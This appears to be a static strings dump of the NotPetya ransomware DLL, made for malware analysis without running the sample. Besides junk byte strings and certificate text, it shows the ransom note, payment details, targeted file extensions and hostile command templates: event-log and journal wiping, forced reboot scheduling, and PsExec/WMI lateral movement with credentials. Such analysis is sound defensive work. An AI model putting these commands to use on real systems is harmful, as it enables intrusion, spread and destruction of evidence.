+  479d0 UQuv
+  47a17 MtWD
+  47a40 y?SJa&=Z~
+  47a6a 'pE4
+  47ac4 @)# 
+  47ad5 iQG^
+  47b02 yN2g
+  47b62 Mb{n(
+  47b80 ]3g5
+  47bc2 )3sO7
+  47bcb *v'*
+  47be3 z~";
+  47c0d n}tn
+  47c2e vJ^u]
+  47cd8  Fi~
+  47d20 ]R+^
+  47d3f ]R'`%
+  47e12 8"e%R
+  47e81 G)e-J|Y
+  47eb0 #t9*
+  47f6e zf8C
+  47f99 )`bY
+  47fb1 GgX;
+  4806b CrGG
+  48070 {=(w
+  48148 SO|R
+  48154 q_SZ
+  48172 Bp	_"
+  481c1 bH70
+  481ef 6TMm$
+  4822e T$+|
+  482a4 %n;H
+  48306 ay=2	
+  4838f AEv%
+  4839b D(X!^k
+  48466 Kl43
+  485d2 i\;Vs
+  48683 E1A|u
+  486b4 0K7T
+  486fd kF ~
+  487a1 r^uf
+  487f6 G8Ny
+  48882 *UY|>Z
+  48901 L\,s
+  48913 &pO|
+  4893d V~ZF3
+  48a1b |$om
+  48a2c *ns&
+  48a8a I33H
+  48aa7 ~=)N
+  48ac2 /kqx:
+  48b81 ZZZ0@
+  48b89 _iaP*
+  48bd5 l}^mye
+  48c16 kX57E
+  48c2e O2_[
+  48c72 A5k!{
+  48d0e GOxh6C]
+  48d21 l:(Kg/2
+  48d29 A<9O
+  48d81 &<d0J$
+  48e74 v3$T/t
+  48ee1 qHsX0k
+  48f7f rlcG:W{
+  48fd2 m(,(
+  48ff0 +G8!
+  49186 uE%^G
+  49272 Nwa(qz
+  4932b PA?UAo
+  4935e E>MW
+  493ca t]-_G
+  493e9 >GBj
+  49474 :e=Z
+  49497 ~\qW
+  494fe eBM|
+  4959d /gCR
+  495b4 j}=W7J
+  495c1 IIX'0
+  49601 *S>i
+  49628 $BV[\
+  4963a RRmqN5e!KI
+  49664 %t(;
+  49670 BJNu
+  496a4 T,@9P
+  4971f CCmQ
+  497bd Cq8LP
+  498a6 aw`$
+  498ba rE8$9:`&
+  498f7 MQx#
+  49908 AE>z*
+  49910 !wHU
+  49979 \CbNa{
+  49a0f p@NA
+  49a8f "KKVcDL
+  49ad6 ]Ef-
+  49b21 Ok<EG
+  49bee u*k3
+  49c7a KhEH*
+  49cac 9N`M
+  49cf3 ktpE
+  49d0f 7_do
+  49d19 ko^;
+  49d7a I/qE
+  49d81 G<{W
+  49d97 ?r\J
+  49da3 MXRg
+  49dd6 lk]s&0
+  49de6 ~~<{S
+  49df1 %O^*
+  49e20 v*<C
+  49e82 U7]rX
+  49eb3 0\U*(
+  49ece +~ak
+  49efa $q'<
+  49f6b j~'zF
+  49f8c 6cpg
+  4a02c %foVcN~
+  4a05c bXl?.
+  4a0b2 K;_a
+  4a0c1 +W;@
+  4a0fa DQVc	\O
+  4a17a R%!Y
+  4a1e0 /VF";
+  4a239 mFoU
+  4a295 sQ)4
+  4a2ef X%UF
+  4a2fb *,.6
+  4a336 l2KU
+  4a38c 85[*d
+  4a3b3 lS+{r
+  4a3b9 n{Na
+  4a3c4 }S?JZf
+  4a3f1 ZvdU
+  4a484 nPx#
+  4a4bf JwL3I
+  4a520 SHmE
+  4a584 #L+)
+  4a5a3 |<OW,
+  4a62d L>>~o
+  4a63d ~D^M
+  4a6c2 #~dNB
+  4a6e5 ?:KA
+  4a771 \"{/
+  4a7ea A;WD5
+  4a816 aMpb1
+  4a84a L(f-
+  4a8a9 2:"D
+  4a8cc [=y:yG
+  4a90d tlJ`	
+  4a920 J`l[~
+  4a9e5 5$f4
+  4aaf4 XmyV
+  4ab9b ga|5~f
+  4aba5 pO|hDG
+  4abe7 33b~
+  4ac35 3z"v
+  4ad51 k}yX
+  4ae3b wRc%
+  4ae57 *`?c
+  4aeb3 `8Vn
+  4aef7 zFl8K
+  4b0af !aX~
+  4b0bc ?f@6
+  4b0df +TXl
+  4b0e8  [bR{
+  4b169 ScRKd
+  4b26f :5v:c
+  4b29d PEwLj/2j0
+  4b2d0 /&B'-8T
+  4b2ed 6W?~1Ev
+  4b367  6;	
+  4b38b z\$q
+  4b3b5 NWLbM
+  4b3dc zF-8
+  4b463 y\5p
+  4b489 \'5vb
+  4b4aa uFc'
+  4b4c4 ,%vzl
+  4b500 }	eqGw
+  4b530 ~8bs
+  4b5ea (s#6;
+  4b5f0 w";}6W
+  4b77f 0mgr
+  4b7bb q/s)
+  4b7ec vP#J
+  4b823 E/<!o
+  4b8c6 0En9;
+  4b8ce 0l	y
+  4b905 N[\?$>r
+  4b910 pd@)
+  4b951 _y:>
+  4ba25 D,Yk
+  4ba55 0`m5
+  4ba6d :YLt
+  4ba8c (BqN
+  4badd [@S=r
+  4bb2e ]M}qR
+  4bb60 }6`,r
+  4bb66 ()w`
+  4bb84 J-2'h
+  4bb8a *{qI
+  4bba5 [{rMz~
+  4bbbd .DK<
+  4bc2b ostP
+  4bc3d qY?>_
+  4bc6c mq*)uXG
+  4bc7e rYqh@
+  4bc9d CAMu
+  4bca2 =R.8D
+  4bd3a !Vu(
+  4bd89 k]d6
+  4be3c ZQSP
+  4be59 |Pq5
+  4bea3 g^"X\
+  4beaa #?x2
+  4bff2 	=Mf
+  4c003 FoUPr$
+  4c08b Fw`O
+  4c090 ?NJJn
+  4c0a3 gk.?fca7
+  4c0b8 Nh7&VuoM
+  4c149 EXtI
+  4c1d0 -f~)@w]
+  4c21f mB\b
+  4c244 scx2
+  4c24e }`<vw
+  4c37b 9U'6
+  4c3b5 0vM5
+  4c3f4 iD!H
+  4c486 -P*rJ
+  4c4a1 pH)(
+  4c4c5 7QJ 
+  4c4d4 {&dK
+  4c52c Zikk[
+  4c579 _No+4
+  4c5d2 	MXQ
+  4c5d7 |YX^f
+  4c742 =;tX
+  4c87d :@v*W
+  4c8a3 696"
+  4c90a ^zCn
+  4c975 +O&5
+  4c9bd xS1^
+  4ca93 ELE{
+  4cb8f w~kcT@
+  4cbff bB8H"t
+  4cc22 =%zv
+  4cc51 |D/lr
+  4cc5b u]4`I
+  4ccf9 2o\@
+  4ce09 22!R	
+  4ce4a <or}
+  4cec8 ggTZF
+  4ceeb g,.+
+  4cf9c xG]`Sjr
+  4cfe1 Bf.\
+  4d011 j&W	n;
+  4d02d A/7^
+  4d055 Y\49
+  4d092 &q+$J
+  4d0de y1EZk
+  4d1a1 u<nA
+  4d232 &W<B
+  4d354 's)T;
+  4d39f ">h+N
+  4d3b4 'gkT
+  4d3db .T	@
+  4d403 YgS&
+  4d497  P8@
+  4d502 W'5T
+  4d532 ZgyCH
+  4d581 vTBW;
+  4d5a8 #5'ma
+  4d640 [(SZ
+  4d659 (P x
+  4d665 I{sH
+  4d67d T58o
+  4d6c2 w+E@
+  4d6d7 ~:||
+  4d745 ^NKn
+  4d790 ,]_So
+  4d7a6 H2$6
+  4d88f p=r{
+  4d8b8 FT$61E"M
+  4d8cf iF $2
+  4d8f7 i9Br
+  4d92f T>L<	
+  4d9bc cxP\W 
+  4db1d *J6jP
+  4db29 0J~{ 
+  4db45 Ya,?
+  4dc79 ~7mA
+  4dd58 >0B-
+  4dd8e !L#"
+  4ddd4 y$iL
+  4ddf0 gVpy
+  4de10 hsBE
+  4de9f &NWN`
+  4deab Rg`B$
+  4dec5 <'"N
+  4df4d r gK
+  4df95 IyxHf
+  4df9b \1?|
+  4e02f 	 l\b
+  4e08e ,cQD@
+  4e0b8 <8$(&
+  4e0c6 A1*#
+  4e11b %#,J
+  4e195 >Gd1!/1
+  4e1a0 zfPbL
+  4e21c utn1E
+  4e224 [wP/
+  4e23b <@5	
+  4e2ba 8j>P3
+  4e319 ]t	e
+  4e338 u'yY%
+  4e36e V`n!
+  4e3c9 inx[LB
+  4e3d4 GXVP
+  4e3dd Aff	
+  4e438 LdB_D
+  4e458 IeKr!
+  4e4db f!Oy
+  4e618 "Xn|
+  4e61f 4FL3
+  4e629 ^yMV
+  4e667 wYOa	
+  4e682 vNZf
+  4e6eb &O90
+  4e71b ]m~S
+  4e786 :vo[
+  4e7ce !jq<
+  4e822 rcl0
+  4e885 [f^d
+  4e8a1 X$.yr!
+  4e908 q`k/
+  4e938 :P+a9
+  4e95a n9/&
+  4e97e yQ%B
+  4e995 PI!n8
+  4e9fc lY(q
+  4ea5f D:`A
+  4ea66 94@i
+  4ea92 s;f3L
+  4eaf2 9W_?F~
+  4ebdf w'vt
+  4ec21 wrg<'
+  4ec7b l7E.
+  4ec93 SPoUP
+  4ecc4 }%(d
+  4ee8f -Ga[
+  4eee3 _i[]
+  4eee9 ,L_-
+  4ef7e o]3n
+  4efa6 <T&BclR|pa\pR
+  4f01e a{V[N
+  4f066 &.60
+  4f0fd cZ'J|
+  4f188 ;6++
+  4f1a8 #A4BQ
+  4f1ae c5F+
+  4f1e5 ,r3a
+  4f232 f4HS
+  4f242 YYok
+  4f269 22x:
+  4f272 G G3
+  4f2bc iS/P
+  4f2ff *G\/
+  4f33f 	CZk&
+  4f38c nw 1
+  4f392 x}c3^
+  4f3a0 `fqm
+  4f3ee X]neuIcf
+  4f4dc 5G!g
+  4f690 yQ*x
+  4f6bd rq|!
+  4f6df zH9:M~
+  4f785 9\7&
+  4f7b6 `[<*
+  4f827 |*,/
+  4f87f i&o:
+  4f8d5 +5wH-Q
+  4f8e8 {"Wj
+  4f9fb h3h=]
+  4fb1b QV`[8
+  4fb39 qq'i
+  4fb77 R(-G	
+  4fb89  n]x
+  4fbf0 hoIH
+  4fc2c .`h_iJR
+  4fc3a  (t'8
+  4fdd5 9(|;
+  4fe11 x)YF
+  4fe26 1_DK]
+  4ff4c 1sb_AF
+  4ff8c GZCV+
+  4ffb8 &Xbo
+  4fffb A7PP*
+  50023 \,?{+$
+  50157 \0C'\
+  501c5 &xND-}Mx
+  502a6 YIO:
+  502b6 s#=m
+  502e6 s#=7
+  502fa .zngp
+  503de Fp.p
+  50503 ?D?p
+  50512 QpF(
+  50599 qJ!~	
+  505ba zH7R
+  505cb BNuY
+  5061b 6?-=}Kq
+  506cb NhF%
+  506ee &+$4
+  5071e @X#B}
+  507a1 ;+MX
+  507b2 sK!k
+  507b8 j-8]vj
+  507c0 ,Mi%
+  507f4 $81_D	gMe
+  50818 VSm+
+  50831 PACA
+  508e9 [kZi
+  50966 (G4"X
+  5097f *eC(
+  509e5 hh3b<
+  50ac9 T;b *
+  50b29 xe5t
+  50bd7 b|wA_
+  50c33 ECT6
+  50c47 p5Az
+  50c7a !y!U
+  50c8f UJC~GX> q
+  50cbd P3T~L
+  50cce <l<|
+  50d23 h^ZZ8kDx5w
+  50d54 @02k@
+  50da7 hs"LB
+  50e30 8`Zl
+  50e98 Jk(S
+  50ec5 9Mnr
+  50f7d j:13,
+  50fab 2TPE
+  50fb2 vdD!
+  50fd3 X8RfZ:
+  51002 zGHTV
+  5101c LZE>
+  5102b W($7b@"
+  51038 V0jD
+  510ee $0qu11
+  5111e EpqG644WQs
+  5112c IyU(
+  5119f Jnw-
+  511c0 8+	B
+  511d1 k H`
+  511db ?A4v
+  51252 !Y%$
+  51329 .{ca
+  51334 |SfV
+  5137e JT6]R
+  513b3 pTGR
+  514db F{yM
+  514e5 q;87
+  514f0 _;W	>&n
+  51516 ,n5g
+  51543 7Q)_
+  51594 L]:l/
+  5159c wfD[J),
+  515e3 842X
+  516fa <K"rR
+  51763 E%c=k	
+  517b2 nS!HI5
+  51882 {#I=
+  5189b s18+g
+  518e9 zs+}T
+  5191c [/:\;
+  5193f f[M5&
+  51961 	D/jG
+  51967 Y6xS
+  519b8 U&R9
+  51a14 F5=.
+  51b5a szn7
+  51b96 d'P5
+  51bb8 :]m'j
+  51bef *AJ3p
+  51c3a 9nA*
+  51c48 	'8n
+  51ca6 &&A2am!
+  51cc3 {h_+
+  51ccc HMhX%
+  51cfc EAET
+  51d0d   6Br
+  51d25 ]{/k[u
+  51dde GbAZ
+  51e0c Qa	}
+  51e12 WVw$
+  51e2f l)T&7
+  51e94 (%T>]
+  51edc H8C=`C
+  51ee3  	DT
+  52020 elbjV
+  521c7 Q0Ea:
+  522e5 cVVG
+  52307 0/I"IP|
+  5236e DR,#iG
+  52380 FqQ<
+  523ca z~l=?
+  52420 pQ4*d`]aY
+  5242e @R,Qe
+  5243c !w6)#
+  5248a V+3)e
+  52541 *,]*74
+  52548 uv=|
+  52556 Ws~i
+  52577 vX`I
+  5261a a8P`
+  52749 eaee
+  52761 IAAqAa
+  5277c DAlA)0
+  5290d Yv\7n
+  52928 gj/o
+  529b5 5H7G
+  52a37 pk!n
+  52af7 \A8$
+  52b02 @BYX
+  52ba7 q",/
+  52bf9 RR[v
+  52c18 %jX~
+  52cd1 &a/g
+  52cd6 :'2B
+  52d0a Tcjx
+  52d16 *kg 
+  52d26 g?TBJ
+  52d3b 61`VR
+  52d4f 4v)G"
+  52db2 "(,$
+  52de1 ^"[,l_
+  52e56 Q.`c:*
+  52e70 Z:.$n
+  52e76 ),,Ok
+  52efb ;(J(
+  52f52 ;\2z
+  52f78 .Z1#\
+  53012 PmWm
+  530e5 ,B-S
+  530f8 (q-c1]
+  53111 [hU;
+  53171 -o3uT
+  531a8 7t8w
+  531c5 \UOQ\
+  53211 @L	Ux
+  53239 X-T"8
+  5329b M 4lh
+  5334b Vzs.i
+  53383 6CwM2
+  533a4 PHyX3Wo
+  53493 ^YX[g
+  53629 <'ck
+  536b4 Uk5\
+  53770 ~:;p
+  5379c 90*:Z
+  53867 EFyD
+  5390f ,-Ni
+  53926 ojT\w
+  5393d PO|;i
+  539b2 AU.R)
+  539f6 k352#
+  53a0c SnM4
+  53b40 zcl\H
+  53b95 ~ONK
+  53ba5 DO[/8S
+  53c0e ]qn+
+  53c29 ykhd
+  53c89 m3m0
+  53ce6 0#L `B
+  53cfd nPcE
+  53d14 GfyS
+  53d37 9#sg
+  53de6 /Ms:
+  53e05 lgQ;
+  53ead 6MZN%S
+  53f3e D^nT
+  53f49 AZO<Kq*l*
+  53f61 1h'.
+  53fcc :,],
+  540f9 kg},
+  54205 )I>?fDzRi
+  54215 ,luo
+  54279 -	Sz
+  54292 uPSw
+  542ba 3p9 
+  54303 84!`
+  5430e TMXCYV
+  5436f E~	w
+  543dc o`Of|q
+  5442f eo{lZ
+  54465 )bH!*
+  54495 w]0|
+  544d5 |5G+
+  544ed ION-
+  5453b =U*}
+  54586 .?lw
+  545d5 >}}o8
+  54626 >r%u
+  54638 kl_}	?O
+  54737 nt_c>8ubN
+  54764 |UIeB
+  547e3 ^k^\9
+  54813 _VDN
+  54836 (xY0x:
+  548a9 V~}{
+  54937 *'Q8
+  5493d R6K<p
+  5499d wI/;
+  54a3f xtwQi~
+  54b8c cdu]45
+  54bab q1iaGZ
+  54bbc }&Rwe
+  54c21 ]=w4
+  54d43 ;g?\
+  54d64 Q? PS
+  54dcd WqkO
+  54ec5 |xA!
+  54f09 S]C.w+
+  54f77 /\4Z0
+  54fcf =4du
+  55088 <GxpS)wN
+  550b7 :;?9d
+  550cb duaY
+  550fd {bTu:
+  5512e kOpl
+  5516c -s/p5p
+  55187 2R]c
+  551d3 W>KKS
+  551e8 co~x
+  55225 ,_q5c
+  5526f pH~A
+  55296 i^gy
+  552c7 (9~D
+  552d2 wQo^?
+  5530a ]ub^
+  55326 ]Zn|1xp
+  5536b Yv#'
+  55400 \PAD
+  55449 A8Jp@
+  55473 j=@{w
+  5550f 	c:x
+  555b3 8b:n^>*
+  555e5 (b87
+  55641 U+Ra[D
+  55651 w,yO
+  55683 6%&|9Z
+  5569a )]K]
+  55762 n2Fh
+  5578a $& B
+  55849 ^V72
+  55852 Kdki
+  5586a dP2&+
+  558a9 ECU~
+  558e6 0*R^
+  558f7 du'B
+  55901 R-XG"A
+  5594c [(0!
+  55989 *:cT
+  55a35 9V=,
+  55a43 ~Glb~
+  55a73 J	U^dJ
+  55abc  u08
+  55af8 ^'	1
+  55b3d j-)H
+  55b6b LOYq
+  55bac b^jN
+  55bb5 c+*y\QZ
+  55bdf khPh
+  55c2e ^4R7p
+  55d70 W6)ZY
+  55d9b &[-gwSs
+  55da4 VVHA
+  55dc1 4pkC
+  55e09 -qA&
+  55e1c GCES
+  55e5d l]$vz6s{,
+  55e84 6xwH
+  55ead NE[o
+  55f66 ,G7]
+  56077 N8rj<
+  560d0 {/Wx
+  560da ?[j,S>}
+  56120 k4~i
+  56135 %<PPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGX
+  5620b 0)000
+  56215 0!1B1L1
+  5621d 2]2j2
+  56229 3!3B3V3`3w3
+  5623f 4?4E4b4u4
+  5625f 7)727F7Z7m7
+  5626b 748S8r8
+  56279 8	9&949;9D9M9
+  56291 90:}:
+  5629f ;0;B;h;v;
+  562af <'<\<h<q<
+  562c1 =&=b=r=
+  562d7 >:>H>[>i>|>
+  562e9 >0???M?X?h?
+  56313 4=6+7
+  56351 6'676M6S6a6l6v6
+  56381 7.797@7I7N7p7u7~7
+  56399 8]:b:
+  563a3 ;$;d;j;
+  563bb =Z=q=
+  563c3 >*>b>
+  563dc '0i0
+  563e3 0H1Q1
+  563eb 2$2*202b2t2y2
+  56417 4$4+444D4N4V4
+  56431 5D5b5i5o5
+  56447 6;6D6r6y6
+  5645b 7Y7u7z7
+  5646f 8K8n8
+  5647b 8 9(999?9H9P9X9]9
+  56491 9"</<|</>
+  564a5 0H1+2
+  564b1 3"4,41484=4
+  564c7 797N7
+  564d5 848l8
+  564dd 8 9D9K9u9{9
+  564ed : :c:w:
+  56505 ;1;8;j;p;
+  56523 <;<\<a<g<
+  56563 1&131[1z1
+  56571 1@2^2
+  5657d 2]3u3|3
+  5658d 4)4=4R4p4
+  565a3 5!5*535^5c5h5s5z5
+  565bd 6#6N6Y6o6w6
+  565d3 7F7O7l7s7
+  565eb 8F8M8U8^8t8
+  565fd 9E9L9
+  56605 :>:R:
+  5660d ;#;L;
+  56617 <'<2<Q<k<s<
+  56635 =#=)=G=M=}=
+  56649 > >->>>C>J>T>Y>_>e>s>
+  56673 ?=?J?W?c?u?
+  56699 0+080P0g0p0
+  566ab 1*161=1\1d1j1s1z1
+  566c7 2$262V2y2
+  566d3 2%3-333<3I3
+  566ef 4*4q4
+  566f9 455B5O5b5h5o5
+  56719 6$6j6
+  56721 6=7Q7
+  5672d 8(8i8
+  56737 9+959e9|9
+  56751 :%:G:M:S:[:h:n:
+  5676d ;.;?;F;N;T;e;|;
+  56785 <-<]<p<
+  56799 =>=G=N=u={=
+  567b1 = >7>U>\>r>
+  567bf >%?w?~?
+  567dc /0@0j0{0
+  567e7 0!1Z1
+  56805 4?4P4
+  5681f 5 5+5D5Q5Z5a5f5
+  5683b 556>6V6v6
+  56853 677D7
+  56859 7#8.8<8A8U8
+  5686f 9"9c9s9
+  5687b :N:y:
+  5688b ;;;V;];z;r<z<
+  5689d <!=-=T=d=x=
+  568b3 ?-?:?J?R?[?
+  568df 1,1B1
+  568f7 273W3k3}3
+  56915 5Q6%7
+  56925 =%>/?|?
+  56969 : :$:(:,:0:4:8:<:@:D:H:L:P:T:X:\:
+  569a3 0!0-0<0T0[0g0v0
+  569c7 1'1?1F1R1a1
+  56a0c `=d=h=l=p=t=x=|=
+  56a29 ;4<8<<<@<D<H<L<
+  5703e Z0X03
+  57075 >0!0	
+  570c1 0p1+0)
+  570cd "Copyright (c) 1997 Microsoft Corp.1
+  570fb Microsoft Corporation1!0
+  5711b Microsoft Root Authority0
+  57137 070822223102Z
+  57146 120825070000Z0y1
+  5716d Washington1
+  57182 Redmond1
+  57194 Microsoft Corporation1#0!
+  571b4 Microsoft Code Signing PCA0
+  571fd %5Iw
+  5720f kLRb
+  57219 Il/$>e
+  5724b J-|o
+  572da +~3n
+  57330 r0p1+0)
+  5733d "Copyright (c) 1997 Microsoft Corp.1
+  5736b Microsoft Corporation1!0
+  5738b Microsoft Root Authority
+  5740d X't*u
+  57479 Bk(q
+  57543 Washington1
+  57558 Redmond1
+  5756a Microsoft Corporation1#0!
+  5758a Microsoft Code Signing PCA0
+  575a8 091207224029Z
+  575b7 110307224029Z0
+  575df Washington1
+  575f4 Redmond1
+  57606 Microsoft Corporation1
+  57626 MOPR1
+  57635 Microsoft Corporation0
+  576a9 uM\F
+  577e3 =0;09
+  577ed 3http://crl.microsoft.com/pki/crl/products/CSPCA.crl0H
+  5782e <0:08
+  5783e ,http://www.microsoft.com/pki/certs/CSPCA.crt0
+  578f0 jT;1_
+  57932 zw9gj
+  5794e s2r6
+  57957 $ROfH
+  57961 &9iPN
+  5797b t8JO0
+  579ad 0p1+0)
+  579b9 "Copyright (c) 1997 Microsoft Corp.1
+  579e7 Microsoft Corporation1!0
+  57a07 Microsoft Root Authority0
+  57a23 060916010447Z
+  57a32 190915070000Z0y1
+  57a59 Washington1
+  57a6e Redmond1
+  57a80 Microsoft Corporation1#0!
+  57aa0 Microsoft Timestamping PCA0
+  57b15 ipfx'f
+  57b28 Y")/
+  57b34 mdmJT
+  57b53 v\/}
+  57b67 %M9wt
+  57b79 9	|v
+  57b94 N+"\hE
+  57c1e r0p1+0)
+  57c2b "Copyright (c) 1997 Microsoft Corp.1
+  57c59 Microsoft Corporation1!0
+  57c79 Microsoft Root Authority
+  57dd8 C/{F
+  57df0 (a|H
+  57e16 wTQ:
+  57e62 Washington1
+  57e77 Redmond1
+  57e89 Microsoft Corporation1#0!
+  57ea9 Microsoft Timestamping PCA0
+  57ec7 080725190115Z
+  57ed6 130725191115Z0
+  57efe Washington1
+  57f13 Redmond1
+  57f25 Microsoft Corporation1
+  57f45 MOPR1'0%
+  57f54 nCipher DSE ESN:85D3-305C-5BCF1%0#
+  57f7d Microsoft Time-Stamp Service0
+  57ffa .5kE
+  5807d bMF/
+  5810d =0;09
+  58117 3http://crl.microsoft.com/pki/crl/products/tspca.crl0H
+  58158 <0:08
+  58168 ,http://www.microsoft.com/pki/certs/tspca.crt0
+  58202 >gbT
+  58214 `G#{'
+  58259 "hFL
+  5829a Os	=
+  582bc z?*[FS	<
+  582f6 Washington1
+  5830b Redmond1
+  5831d Microsoft Corporation1#0!
+  5833d Microsoft Code Signing PCA
+  583dd 1`0^
+  58414 *http://technet.microsoft.com/sysinternals 0
+  5850e <z:\-:
+  5858d Washington1
+  585a2 Redmond1
+  585b4 Microsoft Corporation1#0!
+  585d4 Microsoft Timestamping PCA
+  58630 100427180659Z0#
+  586f7 &%o>!c
+  586fe W;	"G
+  58731 ,cCN
+  5876f 'aS_
+
+
+================================================================================
+STRINGS UTF-16LE COM OFFSET
+================================================================================
+
+$ strings -a -e l -t x -n 4 NotPetya.dll
+
+   f058 #+3;CScs
+   f0cc !1Aa
+   f1b0 	Your personal installation key:
+   f1fc wowsmith123456@posteo.net.
+   f238 2.	Send your Bitcoin wallet ID and personal installation key to e-mail 
+   f2c8 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX
+   f318 Ooops, your important files are encrypted.
+   f374 If you see this text, then your files are no longer accessible, because
+   f406 they have been encrypted. Perhaps you are busy looking for a way to recover
+   f4a0 your files, but don't waste your time. Nobody can recover your files without
+   f53c our decryption service.
+   f572 We guarantee that you can recover all your files safely and easily.
+   f5fc All you need to do is submit the payment and purchase the decryption key.
+   f696 Please follow the instructions:
+   f6dc 1.	Send $300 worth of Bitcoin to following address:
+   f750 MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB
+   fa24 C:\Windows;
+   fa40 .3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip.
+   fc60 %ws.
+   fc80 Microsoft Enhanced RSA and AES Cryptographic Provider
+   fcec README.TXT
+  131f8  "%ws:%ws"
+  13218 kernel32.dll
+  13244 \\.\pipe\%ws
+  13260 "%ws" %ws
+  13274 iphlpapi.dll
+  132a2 e%u.%u.%u.%u
+  132bc TERMSRV/
+  132d0 127.0.0.1
+  132e4 localhost
+  132f8 SeTcbPrivilege
+  13318 SeShutdownPrivilege
+  13340 SeDebugPrivilege
+  13364 C:\Windows\
+  1337c /c %ws
+  1338c ComSpec
+  1339c \cmd.exe
+  133b0 wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D %c:
+  134a8 schtasks %ws/Create /SC once /TN "" /TR "%ws" /ST %02d:%02d
+  13520 at %02d:%02d %ws
+  13544 shutdown.exe /r /f
+  1356c /RU "SYSTEM" 
+  1358c dllhost.dat
+  135fa u%s \\%s -accepteula -s 
+  13630 -d C:\Windows\System32\rundll32.exe "C:\Windows\%s",#1 
+  136a0 wbem\wmic.exe
+  136c0 %s /node:"%ws" /user:"%ws" /password:"%ws" 
+  13718 process call create "C:\Windows\System32\rundll32.exe \"C:\Windows\%s\" #1 
+  137b4 \\%s\admin$
+  137cc \\%ws\admin$\%ws
+  1545c STUB
+  15468 c:\Windows\
+  15480 rundll32.exe 
+  1549c ,#1 
+  1587a STUB
+  16cc0 ,#1 
+  16cd0 rundll32.exe 
+  16cf0 c:\Windows\
+  16d08 STUB
+  172ba STUB
+  5705b <<<Obsolete>>
+  57ce5 SubC
+  583e4 ,Sysinternals Utilitie
+
+
+================================================================================
+FIM
+================================================================================
+Arquivo analisado: /home/victor/NotPetya/NotPetya.dll
+Observação: o alvo não foi executado.
